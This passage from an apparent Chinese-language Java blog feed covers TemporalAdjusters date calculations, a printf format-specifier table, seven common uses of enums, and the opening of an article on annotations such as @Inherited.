<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"明年第一天："</span><span class="token operator">+</span>now<span class="token punctuation">.</span><span class="token keyword">with</span><span class="token punctuation">(</span><span class="token class-name">TemporalAdjusters</span><span class="token punctuation">.</span><span class="token function">firstDayOfNextYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//获取本年第一天</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"本年第一天："</span><span class="token operator">+</span>now<span class="token punctuation">.</span><span class="token keyword">with</span><span class="token punctuation">(</span><span class="token class-name">TemporalAdjusters</span><span class="token punctuation">.</span><span class="token function">firstDayOfYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//获取当月最后一天</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"当月最后一天："</span><span class="token operator">+</span>now<span class="token punctuation">.</span><span class="token keyword">with</span><span class="token punctuation">(</span><span class="token class-name">TemporalAdjusters</span><span class="token punctuation">.</span><span class="token function">lastDayOfMonth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//获取本年最后一天</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"本年最后一天："</span><span class="token operator">+</span>now<span class="token punctuation">.</span><span class="token keyword">with</span><span class="token punctuation">(</span><span class="token class-name">TemporalAdjusters</span><span class="token punctuation">.</span><span class="token function">lastDayOfYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//获取当月第三周星期五</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"当月第三周星期五："</span><span class="token operator">+</span>now<span class="token punctuation">.</span><span class="token keyword">with</span><span class="token punctuation">(</span><span class="token class-name">TemporalAdjusters</span><span class="token punctuation">.</span><span class="token function">dayOfWeekInMonth</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token class-name">DayOfWeek</span><span class="token punctuation">.</span><span class="token constant">FRIDAY</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//获取上周一</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"上周一："</span><span class="token operator">+</span>now<span class="token punctuation">.</span><span class="token keyword">with</span><span class="token punctuation">(</span><span class="token class-name">TemporalAdjusters</span><span class="token punctuation">.</span><span class="token function">previous</span><span class="token punctuation">(</span><span class="token class-name">DayOfWeek</span><span class="token punctuation">.</span><span class="token constant">MONDAY</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//获取下周日</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"下周日："</span><span class="token operator">+</span>now<span class="token punctuation">.</span><span class="token keyword">with</span><span class="token punctuation">(</span><span class="token class-name">TemporalAdjusters</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token class-name">DayOfWeek</span><span class="token punctuation">.</span><span class="token constant">SUNDAY</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中printf的用法总结</title>
    <url>/20221027/c3539d05.html</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>格式</th>
<th>说明</th>
<th>补充说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>%c</td>
<td>单个字符</td>
<td></td>
</tr>
<tr>
<td>%d</td>
<td>十进制整数</td>
<td><code>%d</code>：按整型数据的实际长度输出<br><br><code>%md</code>：m为指定的输出字段的宽度。如果数据的位数小于m，则左端补以空格，若大于m，则按实际位数输出<br><br><code>%ld</code>：输出长整型数据</td>
</tr>
<tr>
<td>%f</td>
<td>十进制浮点数</td>
<td><code>%f</code>不指定宽度，整数部分全部输出，并输出6位小数<br><code>%m.nf</code>输出共占m列，其中有n位小数，如数值宽度小于m左端补空格<br><code>%-m.nf</code>输出共占n列，其中有n位小数，如数值宽度小于m右端补空格</td>
</tr>
<tr>
<td>%o</td>
<td>八进制数</td>
<td><code>%o、%#o</code>： “#”号会将八进制符号“0X”显示出来。大写“X”，则会显示大写英文字符</td>
</tr>
<tr>
<td>%s</td>
<td>字符串</td>
<td><code>%s</code>例如:printf(“%s”, “CHINA”) 输出"CHINA"字符串（不包括双引号）<br><br><code>%ms</code>输出的字符串占m列，如字符串本身长度大于m，则突破获m的限制,将字符串全部输出。若串长小于m，则左补空格<br><br><code>%-ms</code>如果串长小于m，则在m列范围内，字符串向左靠，右补空格<br><br><code>%m.ns</code>输出占m列，但只取字符串中左端n个字符。这n个字符输出在m列的右侧，左补空格<br><br><code>%-m.ns</code>其中m、n含义同上，n个字符输出在m列范围的左侧，右补空格。如果n&gt;m，则自动取n值，即保证n个字符正常输出</td>
</tr>
<tr>
<td>%x</td>
<td>十六进制数</td>
<td><code>%x、%X、%#x、%#X</code>： “#”号会将十六进制符号“0X”显示出来。大写“X”，则会显示大写英文字符</td>
</tr>
<tr>
<td>%%</td>
<td>输出百分号%</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java枚举类型7种常见的用法</title>
    <url>/20221027/5296b9c2.html</url>
    <content><![CDATA[<p>参考：<a href="http://blog.csdn.net/qq_27093465/article/details/52180865">Java 枚举(enum) 详解7种常见的用法</a></p>
<p>JDK1.5引入了枚举类型</p>
<h2 id="用法一：常量">用法一：常量</h2>
<p>在JDK1.5 之前，我们定义常量都是： public static fianl… 。现在好了，有了枚举，可以把相关的常量分组到一个枚举类型里，而且枚举提供了比常量更多的方法。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">Color</span> <span class="token punctuation">{</span>  
	  <span class="token constant">RED</span><span class="token punctuation">,</span> <span class="token constant">GREEN</span><span class="token punctuation">,</span> <span class="token constant">BLANK</span><span class="token punctuation">,</span> <span class="token constant">YELLOW</span>  
<span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="用法二：switch">用法二：switch</h2>
<p>JDK1.6之前的switch语句只支持int,char,enum类型，使用枚举，能让我们的代码可读性更强。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">enum</span> <span class="token class-name">Signal</span> <span class="token punctuation">{</span>  
    <span class="token constant">GREEN</span><span class="token punctuation">,</span> <span class="token constant">YELLOW</span><span class="token punctuation">,</span> <span class="token constant">RED</span>  
<span class="token punctuation">}</span>  
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TrafficLight</span> <span class="token punctuation">{</span>  
    <span class="token class-name">Signal</span> color <span class="token operator">=</span> <span class="token class-name">Signal</span><span class="token punctuation">.</span><span class="token constant">RED</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
        <span class="token keyword">switch</span> <span class="token punctuation">(</span>color<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
        <span class="token keyword">case</span> <span class="token constant">RED</span><span class="token operator">:</span>  
            color <span class="token operator">=</span> <span class="token class-name">Signal</span><span class="token punctuation">.</span><span class="token constant">GREEN</span><span class="token punctuation">;</span>  
            <span class="token keyword">break</span><span class="token punctuation">;</span>  
        <span class="token keyword">case</span> <span class="token constant">YELLOW</span><span class="token operator">:</span>  
            color <span class="token operator">=</span> <span class="token class-name">Signal</span><span class="token punctuation">.</span><span class="token constant">RED</span><span class="token punctuation">;</span>  
            <span class="token keyword">break</span><span class="token punctuation">;</span>  
        <span class="token keyword">case</span> <span class="token constant">GREEN</span><span class="token operator">:</span>  
            color <span class="token operator">=</span> <span class="token class-name">Signal</span><span class="token punctuation">.</span><span class="token constant">YELLOW</span><span class="token punctuation">;</span>  
            <span class="token keyword">break</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="用法三：向枚举中添加新方法">用法三：向枚举中添加新方法</h2>
<p>如果打算自定义自己的方法，那么必须在enum实例序列的最后添加一个分号。而且 Java 要求必须先定义 enum 实例。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">Color</span> <span class="token punctuation">{</span>  
    <span class="token function">RED</span><span class="token punctuation">(</span><span class="token string">"红色"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">GREEN</span><span class="token punctuation">(</span><span class="token string">"绿色"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">BLANK</span><span class="token punctuation">(</span><span class="token string">"白色"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">YELLO</span><span class="token punctuation">(</span><span class="token string">"黄色"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token comment">// 成员变量  </span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>  
    <span class="token keyword">private</span> <span class="token keyword">int</span> index<span class="token punctuation">;</span>  
    <span class="token comment">// 构造方法  </span>
    <span class="token keyword">private</span> <span class="token class-name">Color</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>  
        <span class="token keyword">this</span><span class="token punctuation">.</span>index <span class="token operator">=</span> index<span class="token punctuation">;</span>  
	<span class="token punctuation">}</span>  
	<span class="token comment">// 普通方法  </span>
	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Color</span> c <span class="token operator">:</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
			<span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
				<span class="token keyword">return</span> c<span class="token punctuation">.</span>name<span class="token punctuation">;</span>  
			<span class="token punctuation">}</span>  
		<span class="token punctuation">}</span>  
		<span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  
	<span class="token punctuation">}</span>  
	<span class="token comment">// get set 方法  </span>
	<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
		<span class="token keyword">return</span> name<span class="token punctuation">;</span>  
	<span class="token punctuation">}</span>  
	<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
		<span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>  
	<span class="token punctuation">}</span>  
	<span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
		<span class="token keyword">return</span> index<span class="token punctuation">;</span>  
	<span class="token punctuation">}</span>  
	<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setIndex</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
		<span class="token keyword">this</span><span class="token punctuation">.</span>index <span class="token operator">=</span> index<span class="token punctuation">;</span>  
	<span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="用法四：覆盖枚举的方法">用法四：覆盖枚举的方法</h2>
<p>下面给出一个toString()方法覆盖的例子。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">Color</span> <span class="token punctuation">{</span>  
    <span class="token function">RED</span><span class="token punctuation">(</span><span class="token string">"红色"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">GREEN</span><span class="token punctuation">(</span><span class="token string">"绿色"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">BLANK</span><span class="token punctuation">(</span><span class="token string">"白色"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">YELLO</span><span class="token punctuation">(</span><span class="token string">"黄色"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token comment">// 成员变量  </span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>  
    <span class="token keyword">private</span> <span class="token keyword">int</span> index<span class="token punctuation">;</span>  
    <span class="token comment">// 构造方法  </span>
    <span class="token keyword">private</span> <span class="token class-name">Color</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>  
        <span class="token keyword">this</span><span class="token punctuation">.</span>index <span class="token operator">=</span> index<span class="token punctuation">;</span>  
	<span class="token punctuation">}</span>  
	<span class="token comment">//覆盖方法  </span>
	<span class="token annotation punctuation">@Override</span>  
	<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
		<span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>index<span class="token operator">+</span><span class="token string">"_"</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>  
	<span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="用法五：实现接口">用法五：实现接口</h2>
<p>所有的枚举都继承自java.lang.Enum类。</p>
<p>由于Java 不支持多继承，所以枚举对象不能再继承其他类。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Behaviour</span> <span class="token punctuation">{</span>  
    <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token class-name">String</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>  

<span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">Color</span> <span class="token keyword">implements</span> <span class="token class-name">Behaviour</span><span class="token punctuation">{</span>  
    <span class="token function">RED</span><span class="token punctuation">(</span><span class="token string">"红色"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">GREEN</span><span class="token punctuation">(</span><span class="token string">"绿色"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">BLANK</span><span class="token punctuation">(</span><span class="token string">"白色"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">YELLO</span><span class="token punctuation">(</span><span class="token string">"黄色"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token comment">// 成员变量  </span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>  
    <span class="token keyword">private</span> <span class="token keyword">int</span> index<span class="token punctuation">;</span>  
	<span class="token comment">// 构造方法  </span>
	<span class="token keyword">private</span> <span class="token class-name">Color</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
		<span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>  
		<span class="token keyword">this</span><span class="token punctuation">.</span>index <span class="token operator">=</span> index<span class="token punctuation">;</span>  
	<span class="token punctuation">}</span>  
	<span class="token comment">//接口方法  </span>
	<span class="token annotation punctuation">@Override</span>  
	<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
		<span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>  
	<span class="token punctuation">}</span>  
	<span class="token comment">//接口方法  </span>
	<span class="token annotation punctuation">@Override</span>  
	<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>index<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>  
	<span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="用法六：使用接口组织枚举">用法六：使用接口组织枚举</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Food</span> <span class="token punctuation">{</span>  
    <span class="token keyword">enum</span> <span class="token class-name">Coffee</span> <span class="token keyword">implements</span> <span class="token class-name">Food</span><span class="token punctuation">{</span>  
        <span class="token constant">BLACK_COFFEE</span><span class="token punctuation">,</span><span class="token constant">DECAF_COFFEE</span><span class="token punctuation">,</span><span class="token constant">LATTE</span><span class="token punctuation">,</span><span class="token constant">CAPPUCCINO</span>  
    <span class="token punctuation">}</span>  
    <span class="token keyword">enum</span> <span class="token class-name">Dessert</span> <span class="token keyword">implements</span> <span class="token class-name">Food</span><span class="token punctuation">{</span>  
        <span class="token constant">FRUIT</span><span class="token punctuation">,</span> <span class="token constant">CAKE</span><span class="token punctuation">,</span> <span class="token constant">GELATO</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="用法七：关于枚举集合的使用">用法七：关于枚举集合的使用</h2>
<p>java.util.EnumSet和java.util.EnumMap是两个枚举集合。EnumSet保证集合中的元素不重复；EnumMap中的 key是enum类型，而value则可以是任意类型。关于这个两个集合的使用就不在这里赘述，可以参考JDK文档。</p>
<p>关于枚举的实现细节和原理请参考：</p>
<p>参考资料：《Thinking In Java》第四版</p>
<p><a href="http://softbeta.iteye.com/blog/1185573">http://softbeta.iteye.com/blog/1185573</a></p>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java注解</title>
    <url>/20221027/7039576b.html</url>
    <content><![CDATA[<h1>标准注解</h1>
<p>Java的三种标准注解分别是@Override、@Deprecated和@Suppress Warnings。Java SE55内置了三种，定义在 java.lang中的注解：</p>
<blockquote>
<p>@Override： 用在方法上，当我们想重写一个方法时，在方法上加 @Override，当我们方法的名字出错时，编译器就会报错。</p>
<p>@SuppressWarnings ：用来压制程序中出来的警告，比如在没有用泛型或是方法已经过时的时候。</p>
<p>@Deprecated ：用来表示某个类或属性或方法已经过时，不想别人再用时，在属性和方法上用 @Deprecated 修饰。如果程序员使用了注解为它的元素，那么编译器会发出警告信息。</p>
</blockquote>
<h1>元注解</h1>
<blockquote>
<p><strong>元注解，就是用来中声明注解类型时需要使用到的注解。<strong>Java提供了四种元注解，它们分别是</strong>@Target、@Retention、@Documented和@Inherited。</strong></p>
</blockquote>
<h2 id="Inherited">@Inherited</h2>
<h3 id="注解源码">注解源码</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Documented</span>
<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">ANNOTATION_TYPE</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Inherited</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="使用测试">使用测试</h3>
<p>来源：<a href="https://blog.csdn.net/snow_crazy/article/details/39381695">https://blog.csdn.net/snow_crazy/article/details/39381695</a></p>
<blockquote>
<p>Inherited作用是，使用此注解声明出来的自定义注解，在使用此自定义注解时，如果注解在类上面时，子类会自动继承此注解，否则的话，子类不会继承此注解。</p>
<p>这里一定要记住，使用Inherited声明出来的注解，只有在类上使用时才会有效，对方法，属性等其他无效</p>
</blockquote>
<ul>
<li>
<p>注解定义</p>
  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RetentionPolicy</span></span><span class="token punctuation">;</span>
<span class="token comment">/**
 * 声明的此注解使用了Inherited元注解，表示此注解用在类上时，会被子类所继承
 */</span>
<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Inherited</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">InheritedTest</span> <span class="token punctuation">{</span>

    <span class="token class-name">String</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RetentionPolicy</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">InheritedTest2</span> <span class="token punctuation">{</span>

    <span class="token class-name">String</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>注解使用</p>
  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 父类
 */</span>
<span class="token annotation punctuation">@InheritedTest</span><span class="token punctuation">(</span><span class="token string">"使用Inherited的注解 class"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@InheritedTest2</span><span class="token punctuation">(</span><span class="token string">"未使用Inherited的注解 class"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@InheritedTest</span><span class="token punctuation">(</span><span class="token string">"使用Inherited的注解 method"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@InheritedTest2</span><span class="token punctuation">(</span><span class="token string">"未使用Inherited的注解 method"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@InheritedTest</span><span class="token punctuation">(</span><span class="token string">"使用Inherited的注解 method2"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@InheritedTest2</span><span class="token punctuation">(</span><span class="token string">"未使用Inherited的注解 method2"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">method2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@InheritedTest</span><span class="token punctuation">(</span><span class="token string">"使用Inherited的注解 method2"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">method3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@InheritedTest2</span><span class="token punctuation">(</span><span class="token string">"未使用Inherited的注解 method2"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">method4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@InheritedTest</span><span class="token punctuation">(</span><span class="token string">"使用Inherited的注解 field"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@InheritedTest2</span><span class="token punctuation">(</span><span class="token string">"未使用Inherited的注解 field"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> a<span class="token punctuation">;</span>


    <span class="token annotation punctuation">@InheritedTest</span><span class="token punctuation">(</span><span class="token string">"使用Inherited的注解 field"</span><span class="token punctuation">)</span>
    <span class="token annotation punctuation">@InheritedTest2</span><span class="token punctuation">(</span><span class="token string">"未使用Inherited的注解 field"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> b<span class="token punctuation">;</span>
